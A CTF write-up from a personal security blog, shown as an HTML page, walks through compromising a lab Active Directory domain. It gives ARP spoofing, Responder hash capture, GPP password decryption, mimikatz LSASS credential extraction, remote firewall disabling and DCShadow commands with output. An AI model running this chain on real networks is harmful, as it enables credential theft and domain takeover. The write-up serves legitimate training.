@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.6" />
+
+    
+    
+    
+
+<title>NorzhCTF 2019 &amp; RedHackCTF 2019 - Windows AD - Game of Pwn • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="NorzhCTF 2019 &amp; RedHackCTF 2019 - Windows AD - Game of Pwn"/>
+<meta name="twitter:description" content="The NorzhCTF, organized in conjunction with the 2019 FIC, gave me the opportunity to create, in collaboration with @AzrakelK (L0n3w0lf), the attack scenario in relation to an Active Directory domain. This article gives details about this challenge and presents our solution. The challenge has been replayed during the RedHack CTF 2019 under the same name."/>
+
+<meta property="og:title" content="NorzhCTF 2019 &amp; RedHackCTF 2019 - Windows AD - Game of Pwn" />
+<meta property="og:description" content="The NorzhCTF, organized in conjunction with the 2019 FIC, gave me the opportunity to create, in collaboration with @AzrakelK (L0n3w0lf), the attack scenario in relation to an Active Directory domain. This article gives details about this challenge and presents our solution. The challenge has been replayed during the RedHack CTF 2019 under the same name." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haaxmax.github.io/en/writeups/norzhctf-2019-redhack-2019/game-of-pwn/" />
+<meta property="og:site_name" content="Haax - Personal Blog" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      
+          <a href="https://haaxmax.github.io/en">
+          
+          
+          
+          <div class="author-image">
+            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+        
+      <p class="site__description">
+        <a href="https://haaxmax.github.io">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/en/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haaxmax" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	&nbsp;<a href="https://haaxmax.github.io/en/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/fr/writeups/norzhctf-2019-redhack-2019/game-of-pwn/" hreflang="fr" lang="fr" class="langLink">Français</a>
+      <a rel="alternate" href="/fr/writeups/norzhctf-2019-redhack-2019/game-of-pwn/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2019 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>NorzhCTF 2019 &amp; RedHackCTF 2019 - Windows AD - Game of Pwn</h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 28 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>The NorzhCTF, organized in conjunction with the 2019 FIC, gave me the opportunity to create, in collaboration with <a href="https://twitter.com/AzrakelK" target="blank">@AzrakelK (L0n3w0lf)</a>, the attack scenario in relation to an Active Directory domain. This article gives details about this challenge and presents our solution. The challenge has been replayed during the RedHack CTF 2019 under the same name.</p>
+
+<p>The &ldquo;Game of Pwn - A song of users and domain&rdquo; challenge is a scenario composed of 4 challenges (4 flags) allowing players to discover and exploit some known vulnerabilities or configuration weaknesses in an Active Directory domain.</p>
+
+<h3 id="summary">Summary</h3>
+
+<ul>
+<li><p><a href="#first-statement">First statement</a></p></li>
+
+<li><p><a href="#tl-dr">TL;DR</a></p></li>
+
+<li><p><a href="#requirements">Requirements</a></p>
+
+<ul>
+<li><a href="#connecting-to-internal-network">Connecting to Internal Network</a></li>
+<li><a href="#host-discovery">Host discovery</a></li>
+</ul></li>
+
+<li><p><a href="#challenge-1-domain-entry-point">Challenge 1 - Domain entry point</a></p>
+
+<ul>
+<li><a href="#getting-netntlmv2-user-hash">Getting NetNTLMv2 user hash</a></li>
+<li><a href="#hash-cracking-and-first-flag">Hash cracking and first flag</a></li>
+</ul></li>
+
+<li><p><a href="#challenge-2-client-compromission">Challenge 2 - Client compromission</a></p>
+
+<ul>
+<li><a href="#recon">Recon</a></li>
+<li><a href="#using-sysvol-share">Using SYSVOL share</a></li>
+<li><a href="#ms14-025-vulnerability-exploitation">MS14-025 vulnerability exploitation</a></li>
+<li><a href="#search-and-second-flag">Search and second flag</a></li>
+</ul></li>
+
+<li><p><a href="#challenge-3-domain-control">Challenge 3 - Domain control</a></p>
+
+<ul>
+<li><a href="#getting-the-lsass-dump">Getting the LSASS dump</a></li>
+<li><a href="#lsass-memory-analysis">LSASS memory analysis</a></li>
+<li><a href="#domain-controller-access-and-third-flag">Domain Controller access and third flag</a></li>
+</ul></li>
+
+<li><p><a href="#challenge-4-replication-metadata">Challenge 4 - Replication metadata</a></p>
+
+<ul>
+<li><a href="#enabling-rdp">Enabling RDP</a></li>
+<li><a href="#shutdown-windows-firewall">Shutdown Windows Firewall</a></li>
+<li><a href="#rdp-connection">RDP Connection</a></li>
+<li><a href="#dc-shadow-exploitation">DC Shadow exploitation</a></li>
+<li><a href="#validation-and-getting-the-last-flag">Validation and getting the last flag</a></li>
+</ul></li>
+
+<li><p><a href="#feedback-and-last-word">Feedback and last word</a></p></li>
+</ul>
+
+<h2 id="first-statement">First statement</h2>
+
+<p>Once the challenge platform was reached by the participants, the following statement was given for the scenario.</p>
+
+<pre><code>Welcome on this scenario ! You'll have to pentest a Windows based &quot;company&quot; infrastructure. Let's go !
+
+The first flag is the password for the user Davos Mervault, using the following : ENSIBS{password}
+Then, you'll have to look for private, local, documents.
+</code></pre>
+
+<p>No more information. Players will have them during the challenge, by resolving one by one each challenge.</p>
+
+<h2 id="tl-dr">TL;DR</h2>
+
+<p>This section presents the commands used, in order, to solve the different challenges of the scenario. However, this one fully is explained and detailed below.</p>
+
+<pre><code># Recon on CLIENT01
+$ nmap -v -Pn -n -T4 -sT --reason 10.69.88.0/24
+
+# ARP Spoof
+$ sudo arpspoof -i eth0 -t 10.69.88.23 10.69.88.254
+$ sudo tcpdump -i eth0
+
+# Recon on DC01
+$ sudo nmap -v -Pn -n -T4 -O 10.34.67.4 
+
+# Man in the Middle - NBT-NS - Gathering user account
+sudo responder -I eth0 -wFv
+$ john --format=netntlmv2 --wordlist=&quot;/usr/share/wordlists/rockyou.txt&quot; hash.txt 
+
+# Recon on the domain
+$ rpcclient -U dmervault 10.34.67.4
+rpcclient $&gt; enumdomusers
+rpcclient $&gt; enumdomgroups
+rpcclient $&gt; querygroupmem 0x200
+
+# Network share numeration
+$ cme smb 10.69.88.23 -u dmervault -p littledog --shares  
+$ cme smb 10.34.67.4 -u dmervault -p littledog --shares  
+
+# Digging into SYSVOL and getting GPO
+$ smbclient -U dmervault //10.34.67.4/SYSVOL
+smb: \NORZH.LAN\Policies\{195471B6-B0C6-4AD2-9853-28E2B4E9CEF6}\Machine\Preferences\Groups\&gt; get Groups.xml 
+
+# MS14-025
+$ gpp-decrypt hT4tFpr32vG4LZHmnqXM4d8fJ0MfZZdLg0QK40Oq6UC4atw0nUeUCkJDLb1FzouL
+
+# Admin connection on CLIENT01
+$ cme smb 10.69.88.23 -u Administrator -p &quot;0h_y3@_Y0u_GoAt_Me#&quot; --local-auth
+$ smbclient -U Administrator //10.69.88.23/C$
+smb: \Users\Administrator\Documents\Audit_20_12_2018_Confidentiel\&gt; get flag2.txt
+smb: \Users\Administrator\Documents\Audit_20_12_2018_Confidentiel\&gt; get lsass.DMP
+
+# Gathering domain admin account
+mimikatz # sekurlsa::minidump lsass.DMP
+mimikatz # sekurlsa::logonPasswords /full
+
+# Connection on DC01 and getting the flag
+$ cme smb 10.34.67.4 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot;
+$ smbclient -U jsnow //10.34.67.4/C$
+smb: \Users\jsnow\Documents\&gt; get flag3.txt 
+
+# Enabling RDP
+$ sudo crackmapexec smb 10.69.88.23 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -M rdp -o ACTION=enable
+
+# Firewall check and disabling
+$ sudo crackmapexec smb 10.69.88.23 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -x 'netsh advfirewall show allprofiles'
+$ sudo crackmapexec smb 10.69.88.23 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -x 'netsh advfirewall set allprofiles state off'
+
+# DC Shadow exploitation (shell 1)
+mimikatz # !+
+mimikatz # !processtoken
+mimikatz # lsadump::dcshadow /object:dtargaryen /attribute:description /value:&quot;The Game&quot; /replOriginatingUid:{00000000-0000-0000-0000-000000000000} /replOriginatingTime:&quot;2017-01-01 09:00:00&quot; /replOriginatingUsn:42
+
+# DC Shadow exploitation (shell 2)
+mimikatz # lsadump::dcshadow /push
+
+# Checking success
+$ sudo ./cme smb 10.34.67.4 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -x 'repadmin /showobjmeta DC01.NORZH.LAN &quot;CN=Daenerys Targaryen,CN=Users,DC=NORZH,DC=LAN&quot;'
+
+rpcclient $&gt; queryuser 0x451
+</code></pre>
+
+<p><br/></p>
+
+<h2 id="requirements">Requirements</h2>
+
+<p>This section details the different prerequisites for the challenge, especially the access to the various challenges that were not directly reachable.</p>
+
+<p><br/></p>
+
+<h3 id="connecting-to-internal-network">Connecting to Internal Network</h3>
+
+<p>Once connected to the company&rsquo;s internal network, through switches provided to players, You will quickly realize that there is no DHCP server. Therefore, we need to find a way to identify the LAN we are on in order to manually configure the network.</p>
+
+<p>To do this, we take Wireshark out to see what is happening on the network.</p>
+
+<p><center><img src="/img/writeups/norzhctf-2019/GoP_1_Wireshark.png" alt="Wireshark GoP" class="imgSize"/></center></p>
+
+<p>Quickly, we observe interactions around 2 IP addresses:</p>
+
+<ul>
+<li><strong>10.69.88.88.23</strong> - It seems to be a machine called &ldquo;CLIENT01&rdquo;. Hypothesis, a Windows client?</li>
+<li><strong>10.69.88.254</strong> - This is the LAN gateway.</li>
+</ul>
+
+<p>Packets sent in broadcast inform us about the subnet mask used, so we are on the network <strong>10.69.88.0/24</strong>. Using a Kali Linux attack machine, we modify our <code>/etc/network/interfaces</code> file to configure our interface.</p>
+
+<pre><code class="language-bash">auto eth0
+iface eth0 inet static
+    address 10.69.88.56
+    netmask 255.255.255.0
+    gateway 10.69.88.254 
+</code></pre>
+
+<p>Last thing, we have to restart the network service and we&rsquo;re ready !</p>
+
+<pre><code class="language-bash">$ sudo service networking restart
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="host-discovery">Host discovery</h3>
+
+<p>Second prerequisite for the challenge, knowing your ennemy&hellip; To do this, it will be necessary to do some reconnaissance in order to discover the different machines.</p>
+
+<p>We start with a simple scan on the network range to identify machines on this LAN. Two machines are identified but only one is interesting for us. This is the machine identified with Wireshark. 3 ports are open (135, 139, 445). These are classic ports on Windows machines within a domain.</p>
+
+<pre><code>$ nmap -v -Pn -n -T4 -sT --reason 10.69.88.0/24
+
+Nmap scan report for 10.69.88.23
+Host is up, received user-set (0.0010s latency).
+Not shown: 997 filtered ports
+Reason: 997 no-responses
+PORT    STATE SERVICE      REASON
+135/tcp open  msrpc        syn-ack
+139/tcp open  netbios-ssn  syn-ack
+445/tcp open  microsoft-ds syn-ack
+</code></pre>
+
+<p>At this time, we have a client machine, but still no Domain Controller (DC)&hellip;. Maybe in a second LAN?</p>
+
+<p>We known that the client communicates with his DC, particularly through the gateway. Thus, it is possible to perform ** <strong>ARP Spoofing</strong>. This is a network poisoning method in order to impersonate someone else. In our case, we will pretend to be the gateway (10.69.88.254) and thus receive the client&rsquo;s packets (10.69.88.23) in order to see their destination.</p>
+
+<pre><code class="language-bash"># Terminal 1 - Poisoning
+$ sudo arpspoof -i eth0 -t 10.69.88.23 10.69.88.254
+8:0:27:43:ec:a7 8:0:27:ab:61:71 0806 42: arp reply 10.69.88.254 is-at 8:0:27:43:ec:a7
+8:0:27:43:ec:a7 8:0:27:ab:61:71 0806 42: arp reply 10.69.88.254 is-at 8:0:27:43:ec:a7
+8:0:27:43:ec:a7 8:0:27:ab:61:71 0806 42: arp reply 10.69.88.254 is-at 8:0:27:43:ec:a7
+8:0:27:43:ec:a7 8:0:27:ab:61:71 0806 42: arp reply 10.69.88.254 is-at 8:0:27:43:ec:a7
+
+# Terminal 2 - Listening
+$ sudo tcpdump -i eth0
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+16:54:13.156934 IP 10.69.88.23.51154 &gt; 10.34.67.4.domain: 9046+ A? TH3G4ME.NORZH.LAN. (35)
+</code></pre>
+
+<p>An IP address is found, it is 10.34.67.4. A quick port scan on this one reveals what we wanted, it is indeed a domain controller!</p>
+
+<pre><code>$ sudo nmap -v -Pn -n -T4 -O 10.34.67.4 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-26 17:50 CET
+Initiating SYN Stealth Scan at 17:50
+Scanning 10.34.67.4 [1000 ports]
+Completed SYN Stealth Scan at 17:50, 4.07s elapsed (1000 total ports)
+Initiating OS detection (try #1) against 10.34.67.4
+Nmap scan report for 10.34.67.4
+Host is up (0.00084s latency).
+Not shown: 984 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49159/tcp open  unknown
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Microsoft Windows 2012
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2
+OS details: Microsoft Windows Server 2012 or Windows Server 2012 R2
+Uptime guess: 0.020 days (since Sat Jan 26 17:22:17 2019)
+TCP Sequence Prediction: Difficulty=252 (Good luck!)
+IP ID Sequence Generation: Incremental
+</code></pre>
+
+<p>Everything is ready for the challenge !</p>
+
+<p><br/></p>
+
+<h2 id="challenge-1-domain-entry-point">Challenge 1 - Domain entry point</h2>
+
+<p>The first part of the challenge is to find an entry point to the Active Directory domain or Windows machines. No credentials are known at this time of the challenge.</p>
+
+<p><br/></p>
+
+<h3 id="getting-netntlmv2-user-hash">Getting NetNTLMv2 user hash</h3>
+
+<p>In the context of a company system, it is not uncommon for computers in the domain to search for various resources on the network. However, if a client is unable to find a particular resource, if this has not been disabled, it will successively send LLMNR and NBT-NS requests to ask neighboring machines if they do not know the resource.</p>
+
+<p>It is possible to exploit this behavior by performing a Man In The Middle attack, using the <strong>responder</strong> tool for example. In practice, if this type of request circulates on the network, our machine (attacker) will then answer as this resource. Thus, a response is sent to the client, telling him that the resource has been found and it sends his credentials on the network in order to connect to it.</p>
+
+<pre><code>$ sudo responder -I eth0 -wFv
+
+[+] Listening for events...
+[*] [NBT-NS] Poisoned answer sent to 10.69.88.23 for name TH3G4ME (service: File Server)
+[SMBv2] NTLMv2-SSP Client   : 10.69.88.23
+[SMBv2] NTLMv2-SSP Username : NORZH\dmervault
+[SMBv2] NTLMv2-SSP Hash     : dmervault::NORZH:b36fe00d35fbe870:CD538CF0935600E8C065F9CA4830B677:0101000000000000C0653150DE09D201D3C9ADFEC5AEFA66000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000002000009811A9EAB1FE9DADCBB5D03032B97801110DF0BCCD0C7A06D494CFEBD85161180A001000000000000000000000000000000000000900180063006900660073002F00540048003300470034004D004500000000000000000000000000
+</code></pre>
+
+<p>A domain user account is found with this technique! The user <strong>dmervault</strong>. However, even if there are &ldquo;Pass the Hash&rdquo; attacks, the plaintext password is often necessary.</p>
+
+<p><br/></p>
+
+<h3 id="hash-cracking-and-first-flag">Hash cracking and first flag</h3>
+
+<p>The captured hash is a Net-NTLMv2 (NTLMv2) one. This is the default hash type used since Windows 2000. It is possible to crack this type of hash, even if it can take a long time.</p>
+
+<p>In real life, companies are often equipped with password policies, involving user passwords with a certain complexity (but not always&hellip;) but in the context of a CTF, it is not uncommon for the passwords to be found from some known wordlists.</p>
+
+<p>Thus, we can try to crack the hash previously captured, using <strong>John</strong>.</p>
+
+<pre><code>$ john --format=netntlmv2 --wordlist=&quot;/usr/share/wordlists/rockyou.txt&quot; hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+littledog        (dmervault)
+1g 0:00:00:00 DONE (2019-01-26 17:29) 8.333g/s 341391p/s 341391c/s 341391C/s littledog
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Quite quickly, the user&rsquo;s password falls off ! We therefore have a user account, potentially able to connect to the domain and the first flag of the challenge : ENSIBS{littledog}</p>
+
+<p><br/></p>
+
+<h2 id="challenge-2-client-compromission">Challenge 2 - Client compromission</h2>
+
+<p>At this stage, we have a domain user account, and some information about the rest of the challenge. Indeed, it is indicated that we should search for private and local files, so probably on the client machine.</p>
+
+<p><br/></p>
+
+<h3 id="recon">Recon</h3>
+
+<p>Having new rights, it may be interesting to carry out a recognition phase. For example, you can connect to the domain controller in RPC to collect information.</p>
+
+<pre><code>$ rpcclient -U dmervault 10.34.67.4
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+Enter WORKGROUP\dmervault's password: 
+rpcclient $&gt;
+</code></pre>
+
+<p>First, we retrieve the list of users and groups in the domain. This action allows us to learn more and start targeting our searches and attacks.</p>
+
+<pre><code>rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[nstark] rid:[0x450]
+user:[jsnow] rid:[0x451]
+user:[dtargaryen] rid:[0x452]
+user:[dmervault] rid:[0x455]
+
+rpcclient $&gt; enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[DnsUpdateProxy] rid:[0x44f]
+</code></pre>
+
+<p>We know that sensitive groups are the privileged groups. In this case, the best example is the <strong>Domain Admins</strong> group containing administrator users.  Group members can therefore be retrieved using the group&rsquo;s RID.</p>
+
+<pre><code>rpcclient $&gt; querygroupmem 0x200
+    rid:[0x451] attr:[0x7]
+    rid:[0x1f4] attr:[0x7]
+</code></pre>
+
+<p>We can see that two users are members of this group. The first, with the <strong>RID 1F4</strong> (=500) is the <strong>Administrator</strong> account created by default when the domain is created. The second, having the <strong>RID 451</strong> (=1105) is the user account <strong>Jon Snow (jsnow)</strong>. So we have a target for the future! Digging on this account can be very interesting.</p>
+
+<p>We can then look at the network shares. The tool <strong>CrackMapExec</strong> allows for example to easily list shares on the DC and CLIENT. Nothing very exotic, but we notice nevertheless the <strong>SYSVOL</strong> share, accessible in reading.</p>
+
+<pre><code>$ cme smb 10.69.88.23 -u dmervault -p littledog --shares  
+SMB         10.69.88.23     445    CLIENT01         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:CLIENT01) (domain:NORZH) (signing:False) (SMBv1:True)
+SMB         10.69.88.23     445    CLIENT01         [+] NORZH\dmervault:littledog 
+SMB         10.69.88.23     445    CLIENT01         [+] Enumerated shares
+SMB         10.69.88.23     445    CLIENT01         Share           Permissions     Remark
+SMB         10.69.88.23     445    CLIENT01         -----           -----------     ------
+SMB         10.69.88.23     445    CLIENT01         ADMIN$                          Remote Admin
+SMB         10.69.88.23     445    CLIENT01         C$                              Default share
+SMB         10.69.88.23     445    CLIENT01         IPC$                            Remote IPC
+</code></pre>
+
+<pre><code>$ cme smb 10.34.67.4 -u dmervault -p littledog --shares  
+SMB         10.34.67.4      445    DC01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:DC01) (domain:NORZH) (signing:True) (SMBv1:True)
+SMB         10.34.67.4      445    DC01             [+] NORZH\dmervault:littledog 
+SMB         10.34.67.4      445    DC01             [+] Enumerated shares
+SMB         10.34.67.4      445    DC01             Share           Permissions     Remark
+SMB         10.34.67.4      445    DC01             -----           -----------     ------
+SMB         10.34.67.4      445    DC01             ADMIN$                          Remote Admin
+SMB         10.34.67.4      445    DC01             C$                              Default share
+SMB         10.34.67.4      445    DC01             IPC$                            Remote IPC
+SMB         10.34.67.4      445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.34.67.4      445    DC01             SYSVOL          READ            Logon server share 
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="using-sysvol-share">Using SYSVOL share</h3>
+
+<p><strong>SYSVOL</strong> is a network share that brings together all the elements useful in the DC replication process, but also elements that must be accessible for all computers in the domain (for example, connection scripts, GPO,&hellip;). Therefore, it must be accessible for remote reading. You can connect to it as follows.</p>
+
+<pre><code>$ smbclient -U dmervault //10.34.67.4/SYSVOL
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+Enter WORKGROUP\dmervault's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt;
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="ms14-025-vulnerability-exploitation">MS14-025 vulnerability exploitation</h3>
+
+<p>The interest here is in the <strong>Group Strategies (GPO)</strong> applied to the domain. Some systems are not up to date (which can often happen in a real environment) and suffer from a Microsoft vulnerability, the <strong>MS14-025</strong> allowing the GPO application to be used to retrieve the password of the account used to apply the GPO. In most cases, this is the local administrator of the machine.</p>
+
+<p>We therefore go to the heart of the GPO to find the file <code>Groups.xml</code>, used to store the information of the user involved in the policy.</p>
+
+<pre><code>smb: \NORZH.LAN\Policies\{195471B6-B0C6-4AD2-9853-28E2B4E9CEF6}\Machine\Preferences\Groups\&gt; ls
+  .                                   D        0  Sun Nov 25 17:11:30 2018
+  ..                                  D        0  Sun Nov 25 17:11:30 2018
+  Groups.xml                          A      548  Sun Nov 25 17:11:56 2018
+
+        10395647 blocks of size 4096. 7658701 blocks available
+smb: \NORZH.LAN\Policies\{195471B6-B0C6-4AD2-9853-28E2B4E9CEF6}\Machine\Preferences\Groups\&gt; get Groups.xml 
+getting file \NORZH.LAN\Policies\{195471B6-B0C6-4AD2-9853-28E2B4E9CEF6}\Machine\Preferences\Groups\Groups.xml of size 548 as Groups.xml (107.0 KiloBytes/sec) (average 107.0 KiloBytes/sec)
+</code></pre>
+
+<p>You can see by displaying the file that the default local administrator account (built-in) is used. You can also see his password, encrypted with AES-256.</p>
+
+<pre><code>$ cat Groups.xml 
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;Administrator (built-in)&quot; image=&quot;2&quot; changed=&quot;2018-11-25 16:11:56&quot; uid=&quot;{7F1848E5-9B8D-446A-8C27-348CC2894A4C}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;hT4tFpr32vG4LZHmnqXM4d8fJ0MfZZdLg0QK40Oq6UC4atw0nUeUCkJDLb1FzouL&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;0&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (built-in)&quot;/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre>
+
+<p>The vulnerability is precisely here since Microsoft published a few years ago on the MSDN the private key used to encrypt these passwords&hellip; Private key that remains the same for each encryption. It is therefore possible for anyone who obtains access to SYSVOL to retrieve this file, and thus decrypt the administrator&rsquo;s password. Several tools exist but I used the <strong>gpp-decrypt</strong> tool implemented by default in Kali.</p>
+
+<pre><code>$ gpp-decrypt hT4tFpr32vG4LZHmnqXM4d8fJ0MfZZdLg0QK40Oq6UC4atw0nUeUCkJDLb1FzouL
+/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
+0h_y3@_Y0u_GoAt_Me#
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="search-and-second-flag">Search and second flag</h3>
+
+<p>Now that we have the password for the client administrator, it is possible to connect to it with high privileges !</p>
+
+<pre><code>$ cme smb 10.69.88.23 -u Administrator -p &quot;0h_y3@_Y0u_GoAt_Me#&quot; --local-auth
+SMB         10.69.88.23     445    CLIENT01         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:CLIENT01) (domain:CLIENT01) (signing:False) (SMBv1:True)
+SMB         10.69.88.23     445    CLIENT01         [+] CLIENT01\Administrator:0h_y3@_Y0u_GoAt_Me# (Pwn3d!)
+</code></pre>
+
+<p>This allows you to connect to the C$ share, which is the C: disk of the machine.</p>
+
+<pre><code>$ smbclient -U Administrator //10.69.88.23/C$
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+Enter WORKGROUP\Administrator's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt;
+</code></pre>
+
+<p>This way, the excavations can begin. The statement indicates that the challenge is located in private files, we quickly move to the administrator&rsquo;s private directories where we find a directory <code>Audit_20_12_2018_Confidentiel</code>&hellip; Surprising !</p>
+
+<pre><code>smb: \Users\Administrator\Documents\&gt; ls
+  .                                  DR        0  Mon Nov 26 11:12:30 2018
+  ..                                 DR        0  Mon Nov 26 11:12:30 2018
+  Audit_20_12_2018_Confidentiel       D        0  Wed Nov 28 14:57:22 2018
+  desktop.ini                       AHS      402  Mon Nov 26 10:56:56 2018
+  My Music                          DHS        0  Mon Nov 26 10:56:45 2018
+  My Pictures                       DHS        0  Mon Nov 26 10:56:45 2018
+  My Videos                         DHS        0  Mon Nov 26 10:56:45 2018
+
+        10459647 blocks of size 4096. 5709473 blocks available
+</code></pre>
+
+<p>Thus, we get the second flag of the challenge ! The file is given with instructions for further action.</p>
+
+<pre><code>smb: \Users\Administrator\Documents\Audit_20_12_2018_Confidentiel\&gt; ls
+  .                                   D        0  Wed Nov 28 14:57:22 2018
